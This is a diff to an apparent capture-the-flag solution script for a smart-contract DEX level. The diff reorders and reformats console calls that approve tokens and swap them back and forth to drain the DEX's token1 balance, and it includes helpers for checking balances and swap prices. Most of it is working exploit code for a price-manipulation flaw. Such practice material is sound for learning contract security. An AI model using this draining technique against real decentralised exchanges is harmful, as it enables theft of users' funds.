@@ -4,13 +4,19 @@ Tools needed for this level:
 */
 
 // 1.- Declare variables of tokens' addresses.
-tk1 = await contract.token1();
-tk2 = await contract.token2();
+tk1 = await contract.token1()
+tk2 = await contract.token2()
 
 // 2.- Approve enough tokens for DEX contract address to swap
-await contract.approve(instance, 200);
+await contract.approve(instance, 200)
 
 // 3.- Swap tokens back and forth:
+await contract.swap(tk1, tk2, 10)
+await contract.swap(tk2, tk1, 20)
+await contract.swap(tk1, tk2, 24)
+await contract.swap(tk2, tk1, 30)
+await contract.swap(tk1, tk2, 41)
+await contract.swap(tk2, tk1, 45)
 
 /*
 The received amount if swap 10 token1 to token2:
@@ -29,21 +35,13 @@ If we need to drain all 110 token1, the amount of token2 to be swapped is:
 Swap 45 token2 to 110 token1 as shown in Listing 5.
 */
 
-await contract.swap(tk1, tk2, 10);
-await contract.swap(tk2, tk1, 20);
-await contract.swap(tk1, tk2, 24);
-await contract.swap(tk2, tk1, 30);
-await contract.swap(tk1, tk2, 41);
-await contract.swap(tk2, tk1, 45);
-
-String(await contract.balanceOf(tk1, instance));
-String(await contract.balanceOf(tk2, instance));
-
-String(await contract.get_swap_price(tk2, tk1, 20));
-
-String(await contract.balanceOf(tk1, player));
-String(await contract.balanceOf(tk2, player));
-
 // ------Get token balances of DEX contract address--------------
+String(await contract.balanceOf(tk1, instance))
+String(await contract.balanceOf(tk2, instance))
+
 // ------Helper for viewing the obtainable tokens in each swap----
-// ------Helper for reviewing DEX contract's tokens balance----
+String(await contract.get_swap_price(tk2, tk1, 20))
+
+// ------Helper for reviewing player's tokens balance in DEX----
+String(await contract.balanceOf(tk1, player))
+String(await contract.balanceOf(tk2, player))
